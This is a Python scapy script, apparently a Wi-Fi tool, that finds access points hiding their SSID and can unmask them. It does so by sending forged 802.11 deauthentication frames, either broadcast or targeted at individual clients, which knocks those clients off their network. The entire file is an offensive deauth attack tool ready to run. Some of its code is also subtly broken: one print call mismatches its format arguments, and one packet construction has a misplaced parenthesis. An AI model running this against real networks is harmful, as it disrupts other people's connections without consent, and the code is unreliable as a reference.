#!/usr/bin/python
from scapy.all import *
import argparse
import time

# Constants
hidden_ssid_ap = set()
nuked = set()

parser = argparse.ArgumentParser(prog="hidden-ssid-disover.py",
                                  description="Example: python hidden-ssid-discover.py -i wlan0mon -a -t -d 5 --interval 5")
parser.add_argument("--interface",
                    "-i",
                    help="Specify the wireless interface to use")
parser.add_argument("--timeout",
                    help="Specify the length of time to sniff for 802.11 packets for")
parser.add_argument("--deauth-count",
                    "-d",
                    help="Control the number of de-authentication packets",
                    type=int,
                    default=5)
parser.add_argument("--active",
                    "-a",
                    help="Actively unmask the hidden ESSID by de-authenticating the client from the BSSID",
                    action="store_true")
parser.add_argument("--targeted",
                    "-t",
                    help="Performs an automated and targeted deauth attack. (default is false, a broadcast deauth attack will be performed)",
                    action="store_true")
parser.add_argument("--interval",
                    help="Specify how quickly forged deauthentication frames are sent",
                    type=int,
                    default=1)
parser.add_argument("--debug",
                    help="Enable debug mode",
                    action="store_true")
parser.add_argument("--version",
                    action="version",
                    version="%(prog)s 1.2")
args, leftover = parser.parse_known_args()

# checking Distribution System (DS) bits to determine address interpretation
class checkfcfield(object):

  @classmethod
  def to_ds(self, ds):
    if(ds & 0x1 != 0):
      if(args.debug):
        print("to_ds: %s" % (ds & 0x1 != 0))
      return 1
    else:
      if(args.debug):
        print("to_ds: %s" % (ds & 0x1 != 0))
      return 0

  @classmethod
  def from_ds(self, ds):
    if(ds & 0x2 != 0):
      if(args.debug):
        print("from_ds: %s" % (ds & 0x2 != 0))
      return 1
    else:
      if(args.debug):
        print("from_ds: %s" % (ds & 0x2 != 0))
      return  0

# broadcast deauth method
def ActiveUnmaskBroadcast(client, bssid):
  packet = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
  for n in range(args.deauth_count):
    send(packet, iface=args.interface, verbose=0)
    time.sleep(args.interval)

  print("[-] Sent %s broadcast deauth packets for BSSID %s to %s" % (args.deauth_count, args.interface, bssid, client))
  return 0

# unicast deauth method
def ActiveUnmaskUnicast(client, bssid):
  print("[-] Actively attempting to unmask ESSID for BSSID %s" % bssid)

  packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid/Dot11Deauth(reason=7))
  for n in range(args.deauth_count):
    send(packet, iface=args.interface, verbose=0)
    time.sleep(args.interval)
  
  print("[-] Sent %s deauth packets via %s to BSSID %s for client %s" % (args.deauth_count, args.interface, bssid, client))
  return 0

# Identify and collect all surrounding hidden SSID networks
def PacketHandler(pkt):
  # Find Beacon frames without a SSID
  if pkt.haslayer(Dot11Beacon):
    if not pkt.info:
      if pkt.addr3 not in hidden_ssid_ap:
        hidden_ssid_ap.add(pkt.addr3)
        print("[+] Found a BSSID with a hidden ESSID: %s" % pkt.addr3)

  # Check if captured packet is a 802.11x Probe Response of a known hidden SSID AP
  elif pkt.haslayer(Dot11ProbeResp) and (pkt.addr3 in hidden_ssid_ap):
    print("[+] Successfully unmasked %s's hidden ESSID: %s" % (pkt.addr3, pkt.info))
    if args.debug:
      print(pkt.show())
  
  else:
    if(args.active):
      if args.targeted is True:
        if pkt.haslayer(Dot11) and pkt.type == 2:
          try:
            ds = pkt.FCfield & 0x3
            if (checkfcfield.to_ds(ds) == 0) and (checkfcfield.from_ds(ds) == 0):
              print("[-] IBSS Frame")
              client = pkt.addr2
              bssid = pkt.addr3
            elif (checkfcfield.to_ds(ds) == 1) and (checkfcfield.from_ds(ds) == 0):
              print("[-] Frame sent to AP and bridged to DS")
              client = pkt.addr2
              bssid = pkt.addr1
            elif (checkfcfield.to_ds(ds) == 0) and (checkfcfield.from_ds(ds) == 1):
              print("[-] Frame recived from AP and bridged from DS")
              client = pkt.addr3
              bssid = pkt.addr2
            elif (checkfcfield.to_ds(ds) == 1) and (checkfcfield.from_ds(ds) == 1):
              print("[-] Frame bridged via Wireless Distribution System (WDS)")
              # needs to be further tested
              client = pkt.addr2
              bssid = pkt.addr4
            else:
              print("[!] Frame did not match the 4 perdefined states")
              # QoS Data packets are ending up here
              raise
          except Exception as e:
            print("[!] Error: %s" % e)
            if(args.debug):
              print(pkt.show())

          try:
            # first check if destination address is in hidden_ssid_ap
            if(bssid in hidden_ssid_ap) and (bssid not in nuked):
              print("[-] Performing an unicast unmask attack against BSSID: %s" % bssid)
              ActiveUnmaskUnicast(client, bssid)
              nuked.add(bssid)
            else:
              print("[-] BSSID %s is not known, skipping..." % bssid)
          except Exception as e:
            pass
        else:
          pass
      else:
        for bssid in hidden_ssid_ap:
          if bssid not in nuked:
            print("[-] Performing an active broadcast unmask attack against BSSID: %s" % bssid)
            ActiveUnmaskBroadcast("ff:ff:ff:ff:ff:ff", bssid)
            nuked.add(bssid)
          else:
            pass
    else:
      pass

if __name__ == "__main__":
  if (args.debug):
    print(args)

  # Basic error handling of the programs initalisation
  try:
    arg_test = sys.argv[1]
  except IndexError:
    parser.print_help()
    exit(1)

  # Check attribute dependencies
  if args.targeted is True and args.active is False:
    parser.error("Targeted (-t) deauthentication attacks requires active mode (-a) to be enabled.")

  if args.timeout is not None:
    sniff(args.interface, timeout=int(args.timeout), prn=PacketHandler)
  else:
    sniff(args.interface, prn=PacketHandler)
  exit(0)
